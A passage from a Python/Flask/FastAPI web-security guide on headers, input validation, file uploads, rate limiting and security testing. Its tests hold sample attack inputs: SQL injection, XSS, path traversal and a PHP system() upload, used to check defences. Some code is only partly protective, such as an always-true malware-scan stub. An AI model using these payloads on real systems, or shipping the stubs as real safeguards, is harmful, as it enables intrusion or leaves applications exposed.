# Development: Self-signed certificate
"""
# Generate self-signed certificate (development only!)
openssl req -x509 -newkey rsa:4096 -nodes \
  -out cert.pem -keyout key.pem -days 365
"""

# Run Flask with SSL (development)
if __name__ == '__main__':
    app.run(
        ssl_context=('cert.pem', 'key.pem'),
        host='0.0.0.0',
        port=443
    )

# Run FastAPI with SSL (development)
"""
uvicorn main:app --ssl-keyfile=key.pem --ssl-certfile=cert.pem
"""
```

---

## Security Headers

### Essential Security Headers

```python
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    """Set security headers on all responses."""
    
    # ✅ Prevent MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # ✅ Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    
    # ✅ XSS protection (legacy browsers)
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # ✅ HTTPS enforcement
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains; preload'
    
    # ✅ Referrer policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # ✅ Permissions policy
    response.headers['Permissions-Policy'] = \
        'geolocation=(), microphone=(), camera=()'
    
    # ✅ Content Security Policy
    csp = "; ".join([
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' https://cdn.example.com",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "font-src 'self'",
        "connect-src 'self'",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'"
    ])
    response.headers['Content-Security-Policy'] = csp
    
    return response
```

### Security Headers Middleware

```python
from fastapi import FastAPI
from fastapi.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """Add security headers to all responses."""
    
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        
        # Security headers
        headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Permissions-Policy': 'geolocation=(), microphone=(), camera=()',
            'Content-Security-Policy': (
                "default-src 'self'; "
                "script-src 'self' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data: https:; "
                "font-src 'self'; "
                "connect-src 'self'"
            )
        }
        
        for header, value in headers.items():
            response.headers[header] = value
        
        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)
```

---

## Input Validation and Sanitization

### Input Validation with Pydantic

```python
from pydantic import BaseModel, EmailStr, constr, validator
from typing import Optional
import re

class UserRegistration(BaseModel):
    """Validated user registration model."""
    
    username: constr(min_length=3, max_length=50, regex=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    password: constr(min_length=12)
    age: Optional[int] = None
    
    @validator('username')
    def username_alphanumeric(cls, v):
        """Ensure username contains only alphanumeric and underscore."""
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must be alphanumeric with underscores only')
        return v
    
    @validator('password')
    def password_strength(cls, v):
        """Validate password strength."""
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain uppercase letter')
        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain lowercase letter')
        if not re.search(r'\d', v):
            raise ValueError('Password must contain digit')
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', v):
            raise ValueError('Password must contain special character')
        return v
    
    @validator('age')
    def age_range(cls, v):
        """Validate age range."""
        if v is not None and (v < 13 or v > 120):
            raise ValueError('Age must be between 13 and 120')
        return v

# Usage with FastAPI
from fastapi import FastAPI, HTTPException

app = FastAPI()

@app.post("/register")
async def register(user: UserRegistration):
    """Register user with validated input."""
    # Pydantic automatically validates the input
    # If validation fails, returns 422 Unprocessable Entity
    
    # Process registration
    return {"message": "User registered", "username": user.username}
```

### Input Sanitization

```python
import html
import bleach
from urllib.parse import urlparse

class InputSanitizer:
    """Sanitize user input."""
    
    @staticmethod
    def sanitize_html(text: str) -> str:
        """Remove all HTML tags."""
        return html.escape(text)
    
    @staticmethod
    def sanitize_rich_text(text: str) -> str:
        """Allow only safe HTML tags."""
        allowed_tags = [
            'p', 'br', 'strong', 'em', 'u', 's',
            'ul', 'ol', 'li', 'a', 'h1', 'h2', 'h3'
        ]
        
        allowed_attributes = {
            'a': ['href', 'title'],
        }
        
        return bleach.clean(
            text,
            tags=allowed_tags,
            attributes=allowed_attributes,
            strip=True
        )
    
    @staticmethod
    def sanitize_url(url: str) -> Optional[str]:
        """Validate and sanitize URL."""
        try:
            parsed = urlparse(url)
            
            # Check for valid scheme
            if parsed.scheme not in ['http', 'https']:
                return None
            
            # Check for valid hostname
            if not parsed.netloc:
                return None
            
            return url
            
        except Exception:
            return None
    
    @staticmethod
    def sanitize_filename(filename: str) -> str:
        """Sanitize filename to prevent path traversal."""
        # Remove directory separators
        filename = filename.replace('/', '').replace('\\', '')
        
        # Remove dangerous characters
        filename = re.sub(r'[^\w\s\-\.]', '', filename)
        
        # Limit length
        if len(filename) > 255:
            name, ext = os.path.splitext(filename)
            filename = name[:255-len(ext)] + ext
        
        return filename

# Usage
sanitizer = InputSanitizer()

# HTML escaping
user_input = "<script>alert('XSS')</script>Hello"
safe_output = sanitizer.sanitize_html(user_input)
# Output: "&lt;script&gt;alert('XSS')&lt;/script&gt;Hello"

# Rich text with limited tags
rich_input = "<p>Hello</p><script>alert('XSS')</script>"
safe_rich = sanitizer.sanitize_rich_text(rich_input)
# Output: "<p>Hello</p>"

# URL validation
url = "javascript:alert('XSS')"
safe_url = sanitizer.sanitize_url(url)
# Output: None (invalid scheme)

# Filename sanitization
filename = "../../etc/passwd"
safe_filename = sanitizer.sanitize_filename(filename)
# Output: "etcpasswd"
```

---

## File Upload Security

### Secure File Upload Implementation

```python
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
import os
import magic
import hashlib

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = '/var/www/uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
ALLOWED_MIMETYPES = {
    'image/png',
    'image/jpeg',
    'image/gif',
    'application/pdf'
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

def allowed_file(filename: str) -> bool:
    """Check if file extension is allowed."""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_file_content(file_path: str) -> bool:
    """Validate file content matches extension."""
    mime = magic.from_file(file_path, mime=True)
    return mime in ALLOWED_MIMETYPES

def scan_for_malware(file_path: str) -> bool:
    """Scan file for malware (integrate with ClamAV or similar)."""
    # In production, integrate with antivirus software
    # For now, just return True
    return True

@app.route('/upload', methods=['POST'])
def upload_file():
    """Secure file upload endpoint."""
    
    # Check if file is present
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    # Check if filename is empty
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # ✅ Validate file extension
    if not allowed_file(file.filename):
        return jsonify({'error': 'File type not allowed'}), 400
    
    # ✅ Secure the filename
    filename = secure_filename(file.filename)
    
    # ✅ Generate unique filename to prevent overwrites
    file_hash = hashlib.md5(file.read()).hexdigest()
    file.seek(0)  # Reset file pointer
    
    name, ext = os.path.splitext(filename)
    unique_filename = f"{file_hash}{ext}"
    
    # ✅ Save to upload folder (outside webroot!)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
    file.save(file_path)
    
    # ✅ Validate file content
    if not validate_file_content(file_path):
        os.remove(file_path)
        return jsonify({'error': 'File content does not match extension'}), 400
    
    # ✅ Scan for malware
    if not scan_for_malware(file_path):
        os.remove(file_path)
        return jsonify({'error': 'File failed security scan'}), 400
    
    # ✅ Set proper permissions
    os.chmod(file_path, 0o644)
    
    return jsonify({
        'message': 'File uploaded successfully',
        'filename': unique_filename
    }), 201

# Serve uploaded files securely
@app.route('/uploads/<filename>')
def serve_file(filename):
    """Serve uploaded file securely."""
    # ✅ Validate filename
    filename = secure_filename(filename)
    
    # ✅ Check file exists
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    # ✅ Prevent directory traversal
    if not os.path.abspath(file_path).startswith(
        os.path.abspath(app.config['UPLOAD_FOLDER'])
    ):
        return jsonify({'error': 'Invalid file path'}), 400
    
    # ✅ Set security headers
    return send_from_directory(
        app.config['UPLOAD_FOLDER'],
        filename,
        as_attachment=True,
        max_age=0
    )
```

### Image Upload with Processing

```python
from PIL import Image
import io

def process_uploaded_image(file) -> Optional[str]:
    """
    Process uploaded image safely.
    - Validate image
    - Remove EXIF data
    - Resize if needed
    - Convert to safe format
    """
    try:
        # ✅ Open and validate image
        img = Image.open(file)
        
        # ✅ Verify it's actually an image
        img.verify()
        
        # Re-open for processing (verify closes file)
        file.seek(0)
        img = Image.open(file)
        
        # ✅ Remove EXIF data (may contain sensitive info)
        data = list(img.getdata())
        image_without_exif = Image.new(img.mode, img.size)
        image_without_exif.putdata(data)
        
        # ✅ Resize if too large
        max_size = (1920, 1920)
        if img.size[0] > max_size[0] or img.size[1] > max_size[1]:
            image_without_exif.thumbnail(max_size, Image.LANCZOS)
        
        # ✅ Convert to safe format (PNG or JPEG)
        output = io.BytesIO()
        if img.mode in ('RGBA', 'LA', 'P'):
            image_without_exif.save(output, format='PNG')
            ext = '.png'
        else:
            image_without_exif.save(output, format='JPEG', quality=85)
            ext = '.jpg'
        
        # ✅ Generate unique filename
        output.seek(0)
        file_hash = hashlib.md5(output.read()).hexdigest()
        filename = f"{file_hash}{ext}"
        
        # ✅ Save to upload folder
        output.seek(0)
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(file_path, 'wb') as f:
            f.write(output.read())
        
        return filename
        
    except Exception as e:
        print(f"Error processing image: {e}")
        return None
```

---

## API Security

### Rate Limiting

```python
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["1000 per day", "100 per hour"],
    storage_uri="redis://localhost:6379"
)

# Apply rate limit to specific route
@app.route('/api/search')
@limiter.limit("10 per minute")
def search():
    """Rate-limited search endpoint."""
    query = request.args.get('q')
    # Process search
    return jsonify({'results': []})

# Different limits for authenticated users
@app.route('/api/data')
@limiter.limit("100 per hour", key_func=lambda: request.headers.get('API-Key'))
def get_data():
    """Rate limit by API key."""
    # Return data
    return jsonify({'data': []})

# Exempt certain routes
@app.route('/api/health')
@limiter.exempt
def health():
    """Health check (no rate limit)."""
    return jsonify({'status': 'healthy'})
```

### API Key Authentication

```python
from functools import wraps
import secrets
import hashlib

# Store API keys (in production, use database)
API_KEYS = {}

def generate_api_key() -> str:
    """Generate secure API key."""
    key = secrets.token_urlsafe(32)
    # Store hash, not the key itself
    key_hash = hashlib.sha256(key.encode()).hexdigest()
    API_KEYS[key_hash] = {
        'user_id': 'user123',
        'tier': 'premium',
        'created_at': datetime.utcnow()
    }
    return key

def verify_api_key(api_key: str) -> Optional[dict]:
    """Verify API key and return user info."""
    key_hash = hashlib.sha256(api_key.encode()).hexdigest()
    return API_KEYS.get(key_hash)

def require_api_key(f):
    """Decorator to require valid API key."""
    @wraps(f)
    def decorated(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        
        if not api_key:
            return jsonify({'error': 'API key required'}), 401
        
        user_info = verify_api_key(api_key)
        
        if not user_info:
            return jsonify({'error': 'Invalid API key'}), 401
        
        request.api_user = user_info
        return f(*args, **kwargs)
    
    return decorated

@app.route('/api/protected')
@require_api_key
def protected_api():
    """Protected API endpoint."""
    return jsonify({
        'data': 'sensitive information',
        'user': request.api_user
    })
```

---

## Dependency Management

### Checking for Vulnerabilities

```bash
# Install safety
pip install safety

# Check for known vulnerabilities
safety check

# Check specific requirements file
safety check --file requirements.txt

# Generate report
safety check --json > security-report.json
```

```python
# requirements.txt management

# ✅ Pin exact versions
Flask==2.3.0
SQLAlchemy==2.0.0
bcrypt==4.0.1

# ❌ Avoid unpinned versions
# Flask
# SQLAlchemy
# bcrypt

# ✅ Use pip-audit for automated checks
"""
pip install pip-audit
pip-audit
"""
```

### Automated Security Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install safety bandit
      
      - name: Run safety check
        run: safety check
      
      - name: Run bandit security scan
        run: bandit -r . -f json -o bandit-report.json
```

---

## Security Testing

### Security Testing Checklist

```python
"""
Security Testing Checklist:

✅ Authentication
- [ ] Test password strength requirements
- [ ] Test account lockout after failed attempts
- [ ] Test session timeout
- [ ] Test logout functionality
- [ ] Test password reset flow

✅ Authorization
- [ ] Test access to unauthorized resources
- [ ] Test privilege escalation
- [ ] Test horizontal access control (accessing other users' data)
- [ ] Test vertical access control (accessing admin functions)

✅ Input Validation
- [ ] Test SQL injection on all inputs
- [ ] Test XSS on all outputs
- [ ] Test file upload with malicious files
- [ ] Test command injection
- [ ] Test path traversal

✅ Session Management
- [ ] Test session fixation
- [ ] Test session hijacking
- [ ] Test concurrent sessions
- [ ] Test session ID randomness

✅ Error Handling
- [ ] Test verbose error messages
- [ ] Test stack traces in production
- [ ] Test information disclosure

✅ Configuration
- [ ] Test default credentials
- [ ] Test debug mode in production
- [ ] Test exposed admin interfaces
- [ ] Test directory listing
"""
```

### Automated Security Testing

```python
# test_security.py
import pytest
from app import app, db

@pytest.fixture
def client():
    """Test client."""
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client

def test_sql_injection(client):
    """Test SQL injection prevention."""
    # Try SQL injection in login
    response = client.post('/login', data={
        'username': "admin' OR '1'='1",
        'password': "anything"
    })
    
    # Should not log in
    assert response.status_code == 401

def test_xss_prevention(client):
    """Test XSS prevention."""
    # Try XSS in search
    response = client.get('/search?q=<script>alert("XSS")</script>')
    
    # Response should escape the script tag
    assert b'<script>' not in response.data
    assert b'&lt;script&gt;' in response.data

def test_csrf_protection(client):
    """Test CSRF protection."""
    # Try to submit form without CSRF token
    response = client.post('/transfer', data={
        'to': 'attacker',
        'amount': 1000
    })
    
    # Should be rejected
    assert response.status_code == 403

def test_password_strength(client):
    """Test password strength requirements."""
    # Try weak password
    response = client.post('/register', data={
        'username': 'testuser',
        'password': 'weak'
    })
    
    # Should be rejected
    assert response.status_code == 400
    assert b'password' in response.data.lower()

def test_rate_limiting(client):
    """Test rate limiting."""
    # Make many requests
    for _ in range(100):
        response = client.get('/api/search?q=test')
    
    # Should be rate limited
    assert response.status_code == 429

def test_file_upload_validation(client):
    """Test file upload security."""
    # Try to upload .php file
    data = {
        'file': (io.BytesIO(b"<?php system('ls'); ?>"), 'evil.php')
    }
    
    response = client.post('/upload', data=data)
    
    # Should be rejected
    assert response.status_code == 400
```

---

## Best Practices

### Security Checklist

```python
"""
✅ Web Application Security Checklist:

AUTHENTICATION & AUTHORIZATION
✅ Use strong password hashing (Argon2, bcrypt)
✅ Implement account lockout after failed attempts
✅ Use multi-factor authentication
✅ Implement proper session management
✅ Use secure session cookies (HttpOnly, Secure, SameSite)
✅ Implement proper authorization checks

INPUT VALIDATION
✅ Validate all user input
✅ Use parameterized queries (prevent SQL injection)
✅ Escape output (prevent XSS)
✅ Implement CSRF protection
✅ Validate file uploads
✅ Sanitize filenames

CONFIGURATION
✅ Use HTTPS everywhere
✅ Set security headers
✅ Disable debug mode in production
✅ Use environment variables for secrets
✅ Keep dependencies updated
✅ Use security scanners

ERROR HANDLING
✅ Don't expose stack traces
✅ Use generic error messages
✅ Log security events
✅ Monitor for attacks

DATA PROTECTION
✅ Encrypt sensitive data at rest
✅ Use TLS for data in transit
✅ Don't log sensitive data
✅ Implement data retention policies

CODE PRACTICES
✅ Follow principle of least privilege
✅ Keep security simple
✅ Perform security code reviews
✅ Use static analysis tools
✅ Conduct penetration testing
"""
```

### Security Headers Implementation

```python
class SecurityConfig:
    """Security configuration for production."""
    
    # Strong secret key
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
    
    # Session configuration
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = timedelta(hours=2)
    
    # CSRF protection
    WTF_CSRF_ENABLED = True
    WTF_CSRF_TIME_LIMIT = None
    
    # File upload
    MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB
    
    # Rate limiting
    RATELIMIT_STORAGE_URL = 'redis://localhost:6379'
    
    # Database
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    SQLALCHEMY_ECHO = False
    
    # Logging
    LOG_LEVEL = 'INFO'
```

---

## Summary

This comprehensive guide covered:

1. **OWASP Top 10**: Understanding major security vulnerabilities
2. **SQL Injection**: Prevention with parameterized queries and ORMs
3. **XSS Prevention**: Output escaping and Content Security Policy
4. **CSRF Protection**: Token-based protection for state-changing requests
5. **Password Security**: Argon2/bcrypt hashing and strength validation
6. **Authentication**: Secure session management and JWT tokens
7. **HTTPS**: Forcing encrypted connections
8. **Security Headers**: Protection against common attacks
9. **Input Validation**: Validating and sanitizing user input
10. **File Upload Security**: Safe file handling and validation
11. **API Security**: Rate limiting and API key management
12. **Dependency Management**: Keeping libraries secure
13. **Security Testing**: Automated and manual testing approaches
14. **Best Practices**: Comprehensive security checklist

Key Takeaways:
- Never trust user input - validate everything
- Use proven security libraries, don't roll your own
- Layer security defenses (defense in depth)
- Keep software and dependencies updated
- Use HTTPS everywhere
- Hash passwords properly (Argon2 or bcrypt)
- Implement proper authentication and authorization
- Set security headers
- Log security events and monitor for attacks
- Test security regularly

Remember: Security is not a feature, it's a requirement!